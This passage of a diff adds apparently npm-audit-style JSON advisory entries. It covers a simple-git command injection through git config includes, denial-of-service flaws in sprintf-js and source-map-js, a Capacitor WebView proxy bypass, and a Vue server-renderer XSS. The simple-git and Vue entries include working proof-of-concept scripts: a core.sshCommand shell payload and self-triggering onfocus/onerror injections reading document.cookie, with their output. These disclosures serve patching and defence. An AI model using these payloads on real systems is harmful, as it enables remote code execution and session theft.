+      "overview": "## Summary\n\nAn OS command injection vulnerability in `git.clone()` allows any application that flows attacker-influenced data into `customArgs` to execute arbitrary code. simple-git 3.36.0 (current latest on npm) ships without any `include.path` entry in the `blockUnsafeOperationsPlugin` denylist. Passing `-c include.path=<file>` via customArgs loads any local file as a gitconfig. The loaded file can set `core.sshCommand` (or any otherwise-denied key), and the next remote operation in the same clone executes the attacker's command.\n\nPR #1167 (merged to main 2026-05-10, not yet released to npm) adds `preventConfigBuilder('include.path', 'allowUnsafeInclude')` to the denylist. The generated regex `/\\s*include.path/` closes the plain spelling but does not match the conditional form `includeIf.<cond>.path`. The variant therefore survives the upcoming release if the regex is not tightened in the same cycle.\n\nThis sits in the same denylist class as the prior incomplete-fix chain (CVE-2022-24433, CVE-2022-24066, CVE-2022-25912, CVE-2022-25860, CVE-2026-28291, CVE-2026-28292). `include` and `includeIf` are not referenced in any published advisory, in any commit prior to PR #1167, or anywhere in the 3.36.0 source.\n\n## Details\n\nTwo sinks share the same root cause: the denylist is incomplete.\n\n### Sink A: published 3.36.0 has no `include.path` entry\n\n`packages/argv-parser/src/vulnerabilities/detect-vulnerable-config-writes.ts` in the v3.36.0 tag contains no entry for `include.path` or `includeIf.*.path`. The argv parser recognises `-c include.path=<file>` and `-c includeIf.<cond>.path=<file>` as config writes, but `detectVulnerableConfigWrites` iterates a denylist that does not include either key. The plugin returns no vulnerability and the operation proceeds.\n\n### Sink B: pending PR #1167 regex misses `includeIf`\n\nPR #1167 adds:\n\n```ts\nconst preventUnsafeConfig = [\n   // ...\n   preventConfigBuilder('include.path', 'allowUnsafeInclude'),\n   // ...\n];\n```\n\n`preventConfigBuilder` constructs a non-anchored regex from the string:\n\n```ts\nfunction preventConfigBuilder(config, category, message) {\n   const regex = typeof config === 'string'\n      ? new RegExp(`\\\\s*${config.toLowerCase()}`)\n      : config;\n   return function preventCommand(key) {\n      if (regex.test(key)) { /* throw */ }\n   };\n}\n```\n\nFor `'include.path'`, the generated regex is `/\\s*include.path/`. The `.` between `include` and `path` is a regex wildcard. The engine matches `include` plus exactly one arbitrary character plus `path`. Conditional include keys have the form `includeIf.<condition>.path` (`includeIf.gitdir:.path`, `includeIf.onbranch:main.path`, `includeIf.hasconfig:r.u:**.path`, etc.). The substring between `include` and `path` is `if.<condition>:`, always longer than one character. The 11-character match window cannot align and the test returns false.\n\n```js\n/\\s*include.path/.test('include.path')                    // true\n/\\s*include.path/.test('includeif.gitdir:.path')          // false\n/\\s*include.path/.test('includeif.onbranch:main.path')    // false\n```\n\nThe argv parser at `packages/argv-parser/src/argv/analyse-config.ts` correctly recognises both `include.path=...` and `includeIf.gitdir:.path=...` as config writes; both yield a `ConfigWrite` with the lowercased key. The defect is purely in the denylist regex (after PR #1167) and in the entry being absent (before PR #1167).\n\n### Exploitation chain\n\n1. Attacker writes a gitconfig to any path the simple-git process can read. Realistic write primitives: file upload (avatar, attachment, CI artifact, S3-mounted bucket), shared `/tmp` in multi-tenant runners, log poisoning that lands `[core]` headers in a log path, predictable artifact paths, container volume mounts the attacker controls.\n\n   ```\n   [core]\n   sshCommand = \"/bin/sh -c 'id > /tmp/pwned; touch /tmp/RCE'\"\n   ```\n\n2. Attacker triggers `git.clone()` with crafted `customArgs`. Either the URL or the customArgs flow from attacker-influenced input. This is the documented threat model of `blockUnsafeOperationsPlugin`.\n\n3. `cloneTask` assembles `['clone', '-c', '<payload>', pathspec(url), pathspec(dst)]`.\n\n4. `blockUnsafeOperationsPlugin` runs `parseArgv` and `collectWriteFlags`, yielding the write. `detectVulnerableConfigWrites` iterates the denylist. In 3.36.0 the denylist has no entry. After PR #1167 the denylist has an entry but its regex does not match `includeif.gitdir:.path`. Either way, no vulnerability is yielded and the plugin permits the operation.\n\n5. `suffixPathsPlugin` moves pathspec items to the suffix. Final argv: `git clone -c <payload> -- ssh://target.example/repo.git /tmp/dst`.\n\n6. `git clone` has its own `-c` / `--config` option (`-c <key>=<value>, --config <key>=<value>` per `git clone --help`), so a `-c` immediately after the subcommand is honoured by clone itself. Git evaluates the include (the conditional form uses an empty `gitdir:` pattern that matches the current gitdir), reads `/tmp/attacker.cfg`, registers `core.sshCommand`.\n\n7. Git invokes ssh through the configured command. Attacker's shell payload runs in the simple-git process's context.\n\n`git clone` is the unique git subcommand that honours `-c` after itself. `git fetch -c k=v`, `git pull -c k=v`, `git push -c k=v` all reject the placement (those subcommands treat `-c` as a global option that must precede them). Since simple-git always places the subcommand at argv[0], user-controlled `-c` in `customArgs` always lands after the subcommand. Clone is the entry point for both sinks.\n\n### Secondary chain: `HOME` and `XDG_CONFIG_HOME` not in `parseEnv` denylist\n\n`packages/argv-parser/src/env/parse-env.ts:5-25` lists env keys removed from the spawned-process environment when sourced from `git.env(...)`. `HOME`, `XDG_CONFIG_HOME`, and similar config-resolution keys are absent. Calling `git.env({HOME: '/tmp/fake-home'})` makes git read `/tmp/fake-home/.gitconfig`, which the attacker controls. Same exploit primitive, parallel surface. Should be addressed in the same fix.\n\n## PoC\n\nReproduction from a clean install:\n\n```bash\nmkdir /tmp/sg-poc && cd /tmp/sg-poc\nnpm init -y\nnpm install simple-git@3.36.0\ncat > poc.js <<'EOF'\nconst { simpleGit } = require('simple-git');\nconst fs = require('fs');\n\nfs.writeFileSync('/tmp/sg-attacker.cfg',\n   `[core]\\nsshCommand = \"/bin/sh -c 'id > /tmp/sg-id; touch /tmp/sg-pwned'\"\\n`);\n\nconst git = simpleGit({ baseDir: '/tmp' });\n\n(async () => {\n   // Sink A: plain include.path works on published 3.36.0 (no denylist entry).\n   // Swap to 'includeIf.gitdir:.path=...' to demonstrate Sink B against PR #1167.\n   const payload = 'include.path=/tmp/sg-attacker.cfg';\n\n   try {\n      await git.clone(\n         'ssh://nonexistent.example.com/repo.git',\n         '/tmp/sg-rce-dst',\n         ['-c', payload]\n      );\n   } catch (_) { /* clone fails after sshCommand has already run */ }\n\n   await new Promise(r => setTimeout(r, 500));\n   console.log(fs.readFileSync('/tmp/sg-id', 'utf8'));\n})();\nEOF\nnode poc.js\n```\n\nOutput on simple-git 3.36.0:\n\n```\nuid=0(root) gid=0(root) groups=0(root)\n```\n\nSwapping the payload to `'includeIf.gitdir:.path=/tmp/sg-attacker.cfg'` reproduces the same RCE on 3.36.0 and is the variant that will survive the PR #1167 release.\n\n## Impact\n\nPre-authentication remote code execution in any server that flows attacker-influenced data into `customArgs` of `clone()` or `mirror()`. simple-git is approximately 9.4M weekly downloads on npm. Affected consumer patterns:\n\n- CI/CD systems and custom GitHub Actions / Buildkite plugins / GitLab cache helpers\n- PaaS and hosting platforms that accept customer-tunable git options\n- Code analyzers and security scanners that clone user-supplied repos\n- Bot frameworks (Probot, GitOps controllers) that wrap simple-git\n- AI agent frameworks that auto-clone repositories for analysis\n- VS Code extensions, Electron tools, and dev tooling that pass options through\n\nThe chain needs one byte of attacker-writable, process-readable storage in addition to customArgs influence. In consumers where the file-write primitive is co-located with the clone trigger (single-request file upload + clone, multi-tenant CI runners with shared `/tmp`, agent frameworks that write per-task scratch files), this is effectively unauthenticated pre-auth RCE with `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical`. The form value uses the conservative `AC:H = 8.1` baseline that accounts for the separate-request case.\n\n## Distinction from prior advisories and pending fix\n\nReviewed the published GHSA list at `steveukx/git-js/security/advisories`. Two advisories are published:\n\n- GHSA-jcxm-m3jx-f287 (CVE-2026-28291, High): generic option-parsing class addressed by the 3.32.0 refactor\n- GHSA-r275-fr43-pm7q (CVE-2026-28292, Critical): case-insensitive `protocol.allow` form\n\nNeither mentions `include`, `includeIf`, or conditional includes. The terms do not appear anywhere in source files, tests, or commits in the repository at any tagged release. PR #1167 (merged to main 2026-05-10) is the first commit anywhere in the repository to reference `include.path`. It addresses the plain form but its regex misses the conditional `includeIf.<cond>.path` spelling.\n\nThe published 3.36.0 vulnerability (Sink A) is unaddressed in any released version. The pending PR #1167 (Sink B) addresses the plain key but leaves the conditional variant open. Both should land in one release.\n\n## Suggested fix\n\nIn `packages/argv-parser/src/vulnerabilities/detect-vulnerable-config-writes.ts`, add the plain `include.path` entry and ensure conditional forms are covered:\n\n```ts\npreventConfigBuilder('include.path', 'allowUnsafeInclude'),\npreventConfigBuilder(/^\\s*includeif[^.]*(\\..+)*\\.path/i, 'allowUnsafeInclude', 'include.path'),\n```\n\nAlternatively pre-process the key in `parseAssignment` to strip the `if.<condition>:` decoration before testing against `include.path`, since `includeIf` is semantically equivalent to `include` for security purposes.\n\nStronger, longer-term fix: invert the model. Reject any `-c`, `--config`, `--config-env` in `customArgs` unconditionally and require callers to use the typed `config:` option (already prefix-checked through the same plugin). Git's config namespace is open-ended; new dangerous keys land in every git release. A denylist will need new entries indefinitely.\n\nAlso extend `parseEnv` to drop `HOME`, `XDG_CONFIG_HOME`, and any env key that affects config-file resolution.",
+      "reported_by": null,
+      "title": "simple-git allows command execution through unblocked Git configuration includes",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102826"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "simple-git",
+      "vulnerable_versions": "<=3.36.0",
+      "github_advisory_id": "GHSA-g4wm-2vf7-vfgr",
+      "recommendation": "Upgrade to version 4.0.0 or later",
+      "patched_versions": ">=4.0.0",
+      "updated": "2026-10-05T23:48:06.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-77",
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-g4wm-2vf7-vfgr"
+    },
+    "1241202": {
+      "findings": [
+        {
+          "version": "1.1.3",
+          "paths": [
+            "apps__macos>@huggingface/transformers>onnxruntime-node>global-agent>roarr>sprintf-js"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-97058\n- https://github.com/alexei/sprintf.js/issues/237\n- https://github.com/alexei/sprintf.js/blob/3a0d8c26d291b5bd9f1974877ecc50739921d6f5/src/sprintf.js#L17\n- https://github.com/alexei/sprintf.js/blob/3a0d8c26d291b5bd9f1974877ecc50739921d6f5/src/sprintf.js#L84-L90\n- https://www.vulncheck.com/advisories/sprintf-js-through-1.1.3-denial-of-service-via-unbounded-precision\n- https://github.com/advisories/GHSA-hp3w-g68c-fv3c",
+      "created": "2026-09-24T15:31:31.000Z",
+      "id": 1241202,
+      "npm_advisory_id": null,
+      "overview": "sprintf-js through 1.1.3 passes unbounded precision specifiers to toFixed, toExponential, and toPrecision methods without validation, causing uncaught RangeError exceptions. Attackers who control format strings can inject precision values exceeding ECMAScript limits to abort calling operations with minimal payload.",
+      "reported_by": null,
+      "title": "sprintf-js vulnerable to denial of service through unbounded precision specifiers",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-97058"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "sprintf-js",
+      "vulnerable_versions": "<=1.1.3",
+      "github_advisory_id": "GHSA-hp3w-g68c-fv3c",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-10-05T23:47:35.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-hp3w-g68c-fv3c"
+    },
+    "1241209": {
+      "findings": [
+        {
+          "version": "1.2.1",
+          "paths": [
+            "packages__ui>vue>@vue/compiler-dom>@vue/compiler-core>source-map-js"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93749\n- https://github.com/7rulnik/source-map-js/issues/76\n- https://github.com/7rulnik/source-map-js\n- https://github.com/7rulnik/source-map-js/blob/c1cd8904bb7bd0c7fb5879fcda48134d82a27934/lib/source-node.js#L115-L118\n- https://www.vulncheck.com/advisories/source-map-js-through-1.2.1-event-loop-denial-of-service\n- https://github.com/7rulnik/source-map-js/pull/79\n- https://github.com/7rulnik/source-map-js/commit/cf7658058ceeaa8619d5ae0ec90be6905209d016\n- https://github.com/7rulnik/source-map-js/releases/tag/v1.2.2\n- https://github.com/advisories/GHSA-68fv-2mgg-jv7q",
+      "created": "2026-09-18T18:31:44.000Z",
+      "id": 1241209,
+      "npm_advisory_id": null,
+      "overview": "source-map-js through 1.2.1 fails to validate the per-section offset line value in indexed source maps, allowing attackers to specify arbitrary numeric values. Attackers can supply extremely large offset line values that cause synchronous event loop blocking for extended periods, preventing the service from handling other requests.",
+      "reported_by": null,
+      "title": "source-map-js allows event-loop denial of service through indexed source-map section offsets",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93749"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "source-map-js",
+      "vulnerable_versions": ">=1.0.0 <1.2.2",
+      "github_advisory_id": "GHSA-68fv-2mgg-jv7q",
+      "recommendation": "Upgrade to version 1.2.2 or later",
+      "patched_versions": ">=1.2.2",
+      "updated": "2026-10-05T23:31:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-68fv-2mgg-jv7q"
+    },
+    "1241243": {
+      "findings": [
+        {
+          "version": "7.6.7",
+          "paths": [
+            "apps__ios>@capacitor/ios"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ionic-team/capacitor/security/advisories/GHSA-rvm3-566m-v7fv\n- https://nvd.nist.gov/vuln/detail/CVE-2026-103922\n- https://github.com/ionic-team/capacitor/commit/430356a91e1419fc66862dc09835081aa501677e\n- https://github.com/ionic-team/capacitor/commit/745b5f805bf77bc6463977cc7d718cd9de44ccbc\n- https://github.com/ionic-team/capacitor/commit/80b6c5e81d062e1e158914040f49e044d95b7ccb\n- https://github.com/ionic-team/capacitor/commit/85ccc44151fdd5ae5e0d806d875766ef4b84ad5d\n- https://github.com/ionic-team/capacitor/commit/af9a287fef45f0ac68ce640cb42fed2d06b0f1b4\n- https://github.com/ionic-team/capacitor/commit/d5e3170ba0ff155fc542b7e6d16cff5201406540\n- https://github.com/ionic-team/capacitor/commit/ee586ae680887ba99d066616f976db149542d922\n- https://github.com/ionic-team/capacitor/releases/tag/8.5.1\n- https://github.com/advisories/GHSA-rvm3-566m-v7fv",
+      "created": "2026-10-05T22:53:10.000Z",
+      "id": 1241243,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nCapacitor's WebView navigation guard validated only the **host and scheme** of a\ntarget URL, not its **path**. Because the internal HTTP proxy path\n(`/_capacitor_http_interceptor_`) is served at the application's own origin, a\nframe navigation to it was always treated as in-app navigation and allowed.\n\nLoading that path as a document caused the native layer to fetch an arbitrary,\ncaller-specified URL and return the response body to the WebView **at the app's\nown origin**. Script in that response then ran with full same-origin trust:\naccess to `localStorage`, cookies, and every native capability the application\nexposes through its registered Capacitor plugins.\n\nThe proxy handler was additionally served **regardless of whether the\n`CapacitorHttp` plugin was enabled**, so applications that never enabled\n`CapacitorHttp` were also affected.\n\nExploitation requires a victim to activate a link inside the application's\nWebView. Any Capacitor application that renders user-controlled or unsanitized\nlinks (chat messages, comments, rich-text content) is a viable delivery surface.\n\nBoth **Android and iOS** are affected.\n\n### Patches\n\nTwo changes on each platform:\n\n1. The navigation guard now blocks frame navigations whose path is the internal\n   proxy path.\n2. The proxy handler is served only when `CapacitorHttp` is enabled, and never\n   for a document (main frame) request.\n\nLegitimate `CapacitorHttp` usage is unaffected. `fetch` and `XMLHttpRequest` are\nsubresource requests and do not pass through the navigation guard.\n\nUpgrade to a patched version, then rebuild and redistribute your application.\n\n### Workarounds\n\nIf you cannot upgrade immediately, note first that **disabling `CapacitorHttp`\nis not sufficient** on affected versions, because the proxy path is served\nregardless of that setting.\n\nRegistered plugins are consulted before the navigation guard runs, so a small\nplugin can block the path. On Android, override `shouldOverrideLoad(Uri url)` and\nreturn `true` when `url.getPath()` starts with `/_capacitor_http_interceptor_`.\nOn iOS, implement `shouldOverrideLoad(_:)` and return `true` for the same path.\nReturning `true` cancels the navigation; return `null`/`nil` for all other URLs\nso normal navigation is unchanged.\n\nIndependently, sanitize user-controlled link targets before rendering them in the\nWebView.",
+      "reported_by": null,
+      "title": "Capacitor Android and iOS: remote content can be loaded at the app origin via the internal HTTP proxy path",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-103922"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "@capacitor/ios",
+      "vulnerable_versions": ">=7.0.0 <7.6.9",
+      "github_advisory_id": "GHSA-rvm3-566m-v7fv",
+      "recommendation": "Upgrade to version 7.6.9 or later",
+      "patched_versions": ">=7.6.9",
+      "updated": "2026-10-05T22:53:12.000Z",
+      "cvss": {
+        "score": 9.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-346",
+        "CWE-441"
+      ],
+      "url": "https://github.com/advisories/GHSA-rvm3-566m-v7fv"
+    },
+    "1241259": {
+      "findings": [
+        {
+          "version": "3.5.39",
+          "paths": [
+            "packages__ui>vue>@vue/server-renderer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vuejs/core/security/advisories/GHSA-g2v6-rqmx-r4w6\n- https://github.com/vuejs/core/pull/15266\n- https://github.com/vuejs/core/commit/a2b40db9a83b36ed9da3a16403cf8f040262d73f\n- https://github.com/vuejs/core/releases/tag/v3.5.42\n- https://github.com/vuejs/core/releases/tag/v3.6.0-rc.6\n- https://github.com/advisories/GHSA-g2v6-rqmx-r4w6",
+      "created": "2026-10-05T22:50:55.000Z",
+      "id": 1241259,
+      "npm_advisory_id": null,
+      "overview": "## Description\n\n`@vue/server-renderer` was investigated specifically because it's the one place in Vue where template rendering output becomes a real HTTP response body -- a genuine server-side trust boundary, unlike client-side rendering which only ever affects the same browser session that's already running the app's own JS.\n\n`ssrRenderAttrs()` (in `packages/server-renderer/src/helpers/ssrRenderAttrs.ts`) is what compiled SSR output calls for something like `<div v-bind=\"userObject\">`. It loops over the object's own keys and, for each one, renders it as an HTML attribute:\n\n```ts\nexport function ssrRenderDynamicAttr(\n  key: string,\n  value: unknown,\n  tag?: string,\n): string {\n  if (!isRenderableAttrValue(value)) {\n    return ``\n  }\n  const attrKey = ...\n  if (isBooleanAttr(attrKey) || ...) {\n    return includeBooleanAttr(value) ? ` ${attrKey}` : ``\n  } else if (isSSRSafeAttrName(attrKey)) {\n    return value === '' ? ` ${attrKey}` : ` ${attrKey}=\"${escapeHtml(value)}\"`\n  } else {\n    console.warn(`[@vue/server-renderer] Skipped rendering unsafe attribute name: ${attrKey}`)\n    return ``\n  }\n}\n```\n\nThe value always goes through `escapeHtml()` -- that part is correctly and consistently applied everywhere in this file. But the attribute name (`attrKey`) is only checked against a character blacklist, then spliced directly into the output with no escaping of its own:\n\n```ts\n// packages/shared/src/domAttrConfig.ts\nconst unsafeAttrCharRE = /[>/=\"'\\u0009\\u000a\\u000c\\u0020]/\n\nexport function isSSRSafeAttrName(name: string): boolean {\n  if (attrValidationCache.hasOwnProperty(name)) {\n    return attrValidationCache[name]\n  }\n  const isUnsafe = unsafeAttrCharRE.test(name)\n  if (isUnsafe) {\n    console.error(`unsafe attribute name: ${name}`)\n  }\n  return (attrValidationCache[name] = !isUnsafe)\n}\n```\n\nThat blacklist covers: `>`, `/`, `=`, `\"`, apostrophe, tab (U+0009), line feed (U+000A), form feed (U+000C), and space (U+0020). It does not cover U+000D -- carriage return (CR, written as `\\r` in JS).\n\nThat matters because of how browsers actually parse HTML. Per the WHATWG HTML parsing spec, the very first step (\"preprocessing the input stream\") converts every `\\r` not followed by `\\n` into a `\\n` before the tokenizer even starts. So a raw `\\r` sitting inside what Vue intends as a single attribute name gets turned into a real line feed by the browser -- and a line feed is one of the characters that terminates an attribute name and starts a new one. The blacklist checks the string as Vue sees it before the browser gets to reinterpret it, and that's exactly the gap.\n\nBelow is a fresh clone of this repo, confirming the exact commit, the exact vulnerable line, and zero modification to the source:\n\n<img width=\"781\" height=\"336\" alt=\"poc1\" src=\"https://github.com/user-attachments/assets/f4b92955-9a8f-4700-8c51-38ee46912de8\" />\n\n## Prrof\n\nThe real, unmodified  ssrRenderAttrs()  from the published  @vue/server-renderer@3.5.41  package was tested. The source at HEAD and the upcoming  v3.6.0-rc.2  tag were also checked, and the same vulnerable regular expression was present in both; no branch containing a fix was identified.\n\nFull script, saved as `poc.mjs` (GitHub doesn't let me attach `.mjs` directly, so the complete file is here):\n\n```js\nimport { ssrRenderAttrs } from '@vue/server-renderer';\nimport { parseFragment } from 'parse5';\n\n// This is exactly what compiled SSR output calls for `<div v-bind=\"userObject\">`\n// -- the real, unmodified, published ssrRenderAttrs function.\n// Full attack chain: the key itself contains ONLY letters, digits, and a\n// bare \\r (carriage return) -- no '>', '/', '=', '\"', \"'\", tab, LF, FF, or\n// space anywhere, so isSSRSafeAttrName() considers it fully safe. The value\n// is attacker-controlled JavaScript, delivered as the genuine value of the\n// LAST \\r-separated fragment, which Vue's own template naturally appends via\n// `=\"${escapeHtml(value)}\"` immediately after the key.\nconst maliciousKey = 'x\\rautofocus\\ronfocus';\nconst props = {\n  [maliciousKey]: 'alert(document.cookie)',\n};\n\nconst rawAttrString = ssrRenderAttrs(props);\nconsole.log('=== Raw string produced by the real ssrRenderAttrs() ===');\nconsole.log(JSON.stringify(rawAttrString));\nconsole.log();\nconsole.log('=== As it would literally appear in the HTML response ===');\nconsole.log(rawAttrString.replace(/\\r/g, '\\\\r').replace(/\\n/g, '\\\\n\\n'));\n\nconst fullHtml = `<div${rawAttrString}>content</div>`;\nconsole.log();\nconsole.log('=== Full element HTML ===');\nconsole.log(JSON.stringify(fullHtml));\n\n// Now parse this EXACT output with parse5 -- a real, spec-compliant HTML5\n// parser (the same parsing algorithm real browsers implement, including the\n// \\r\\n -> \\n input-preprocessing normalization step).\nconst fragment = parseFragment(fullHtml);\nconst div = fragment.childNodes.find(n => n.tagName === 'div');\nconsole.log();\nconsole.log('=== How a real HTML5 parser (parse5) actually interprets this ===');\nconsole.log('Attributes parsed on the <div>:');\nfor (const attr of div.attrs) {\n  console.log(`  ${JSON.stringify(attr.name)} = ${JSON.stringify(attr.value)}`);\n}\n\nconst injectedHandler = div.attrs.find(a => a.name === 'onfocus');\nconst injectedAutofocus = div.attrs.find(a => a.name === 'autofocus');\nconsole.log();\nif (injectedHandler && injectedAutofocus) {\n  console.log('*** CONFIRMED: real, separate \"autofocus\" and \"onfocus\" attributes were parsed out ***');\n  console.log(`*** onfocus value: ${JSON.stringify(injectedHandler.value)} ***`);\n  console.log('*** This element will execute the attacker JS automatically on page load, no user interaction needed. ***');\n} else {\n  console.log('Not confirmed.');\n}\n```\n\nThis is a fresh `npm install vue@3.5.41 @vue/server-renderer@3.5.41 parse5` -- the real, currently-published packages, not anything modified:\n\n<img width=\"831\" height=\"531\" alt=\"poc2\" src=\"https://github.com/user-attachments/assets/ea350948-4c93-45a3-b21a-f21dc7f90d29\" />\n\nReal, captured output:\n\n```\n=== Raw string produced by the real ssrRenderAttrs() ===\n\" x\\rautofocus\\ronfocus=\\\"alert(document.cookie)\\\"\"\n\n=== Full element HTML ===\n\"<div x\\rautofocus\\ronfocus=\\\"alert(document.cookie)\\\">content</div>\"\n\n=== How a real HTML5 parser (parse5) actually interprets this ===\nAttributes parsed on the <div>:\n  \"x\" = \"\"\n  \"autofocus\" = \"\"\n  \"onfocus\" = \"alert(document.cookie)\"\n\n*** CONFIRMED: real, separate \"autofocus\" and \"onfocus\" attributes were parsed out ***\n*** onfocus value: \"alert(document.cookie)\" ***\n```\n\n<img width=\"834\" height=\"897\" alt=\"poc3\" src=\"https://github.com/user-attachments/assets/a92f9c5b-e30d-4968-9ec1-8969628c6437\" />\n<img width=\"834\" height=\"896\" alt=\"poc4\" src=\"https://github.com/user-attachments/assets/a397cd3f-8eb3-49af-9604-a31a8bcdb2ea\" />\n\nThe single attribute name Vue intended to render safely -- `x\\rautofocus\\ronfocus` -- gets parsed by any real browser as three separate things: an empty `x` attribute, a real `autofocus` boolean attribute, and a real `onfocus=\"alert(document.cookie)\"` event handler. `autofocus` means the element receives focus automatically on page load, which fires the `focus` event immediately, which runs the injected JavaScript -- no click, no hover, no user interaction of any kind required.\n\nThis behavior was confirmed not to be specific to the payload by first isolating the mechanism with a minimal case (`\"foo\\rbar\"` as the key, no other special characters at all), which parse5 also split into two genuine separate attributes (`foo=\"\"` and `bar=\"...\"`), before building the full self-triggering payload above.\n\nTo go beyond the parser-level proof, there is a second script that calls the real `ssrRenderAttrs()`, captures its exact return value programmatically, and writes that unmodified byte sequence directly into an HTML file on disk -- no HTML was hand-typed anywhere in this step. Full script, saved as `generate_real_poc.mjs`:\n\n```js\nimport { ssrRenderAttrs } from '@vue/server-renderer';\nimport fs from 'fs';\n\n// This is the ACTUAL, unmodified ssrRenderAttrs() from the real, installed\n// @vue/server-renderer@3.5.41 -- nothing hand-typed below this line is HTML,\n// it is Vue's own function's real return value, captured programmatically.\nconst maliciousKey = 'x\\rsrc\\ronerror';\nconst props = { [maliciousKey]: 'alert(\"REAL Vue SSR output executed this -- cookie: \" + document.cookie)' };\n\nconst vueOutput = ssrRenderAttrs(props);\n\nconsole.log('=== Vue\\'s real ssrRenderAttrs() returned exactly this string ===');\nconsole.log(JSON.stringify(vueOutput));\n\n// Build the full page around Vue's UNMODIFIED output -- the <img ...> tag\n// content between the angle brackets is copied byte-for-byte from vueOutput,\n// not retyped.\nconst html = `<!DOCTYPE html>\n<html>\n<head><title>Vue SSR PoC -- byte-for-byte Vue output</title></head>\n<body>\n<h3>Everything inside the &lt;img&gt; tag below was written to this file\nprogrammatically from the real return value of <code>ssrRenderAttrs()</code>\nin the actual installed <code>@vue/server-renderer@3.5.41</code> package.\nNo HTML was hand-typed for the tag itself.</h3>\n<p>Exact JSON-escaped string Vue's function returned (see generate_real_poc.mjs, run right before this file was written):</p>\n<pre id=\"vue-output-proof\">${vueOutput.replace(/</g, '&lt;')}</pre>\n<hr>\n<img${vueOutput}>\n</body>\n</html>\n`;\n\nconst outPath = '/Users/onevilx/Desktop/vue-ssr-xss-poc-real.html';\nfs.writeFileSync(outPath, html);\nconsole.log('\\nWrote', outPath);\nconsole.log('Bytes inside the <img...> tag are Vue\\'s real, unmodified return value.');\n```\n\nOpening that generated file in a real browser fires the payload automatically:\n\n<img width=\"1666\" height=\"449\" alt=\"poc5\" src=\"https://github.com/user-attachments/assets/251bd830-634f-4cd0-bf79-849bbc07ec9a\" />\n\nDev tools on that same page confirm the browser genuinely parsed three separate attributes (`x`, `src`, `onerror`), matching the on-page proof text that was written directly from Vue's real return value:\n\n<img width=\"1348\" height=\"400\" alt=\"poc6\" src=\"https://github.com/user-attachments/assets/b19d6ff0-ecaa-45f3-9149-9f3d0d4faacb\" />\n\nWhether this affects client-side (non-SSR) Vue rendering was also checked: it doesn't, and I want to be upfront about that limit too. Client-side Vue sets dynamic attributes via the DOM `setAttribute()` API, which validates the name against the HTML QName grammar and throws a `DOMException` for characters like `\"` (I found an existing, unrelated open issue -- #13944 -- that confirms this behavior). That's a fundamentally different code path with its own validation, and I have not found a way to reach this specific bug through it. This is specifically and only an `@vue/server-renderer` (SSR) issue.\n\n## Impact\n\nThis requires an application to bind an object whose keys (not just values) come from a source the developer doesn't fully control, via `v-bind=\"object\"` or the equivalent compiled form. I want to be honest about how common that is: binding untrusted values into attributes is the standard, everyday Vue pattern that's already safely handled by `escapeHtml()`. Binding untrusted keys is less universal, but it's a real, documented, supported Vue feature, not a misuse of the framework -- and it's exactly the scenario `isSSRSafeAttrName()` exists to defend, which tells me it's already inside your own threat model for this file, just not fully closed. Realistic examples: a CMS or form-builder feature where field/attribute names are configurable by a less-trusted role and gets rendered via SSR to other users; a component that spreads a validated-elsewhere config object onto a root element; any dynamic-attributes helper that takes a plain object where both keys and values may originate from external data (a database record, an API response, a query string parsed into an object).\n\nWhere it's reachable, the impact is a complete, self-triggering stored XSS in server-rendered HTML -- the injected `autofocus`/`onfocus` payload runs the moment the page loads, for every visitor who receives that server-rendered output, with no interaction needed. That's a real trust-boundary break in a security-relevant helper whose entire job is making data safe to render.\n\n## Suggested fix\n\nAdd U+000D (carriage return) to `unsafeAttrCharRE` in `packages/shared/src/domAttrConfig.ts`:\n\n```ts\nconst unsafeAttrCharRE = /[>/=\"'\\u0009\\u000a\\u000c\\u000d\\u0020]/\n```\n\nDouble-checking against the full WHATWG \"ASCII whitespace\" definition (tab, LF, FF, CR, space -- all five) rather than enumerating characters one at a time would help, since that's exactly the kind of list that's easy to leave a gap in, which is what happened here.",
+      "reported_by": null,
+      "title": "@vue/server-renderer: XSS via missing CR in attribute-name blacklist",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@vue/server-renderer",
+      "vulnerable_versions": "<3.5.42",
+      "github_advisory_id": "GHSA-g2v6-rqmx-r4w6",
+      "recommendation": "Upgrade to version 3.5.42 or later",
+      "patched_versions": ">=3.5.42",
+      "updated": "2026-10-05T22:50:56.000Z",
+      "cvss": {
+        "score": 7.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-116"
+      ],
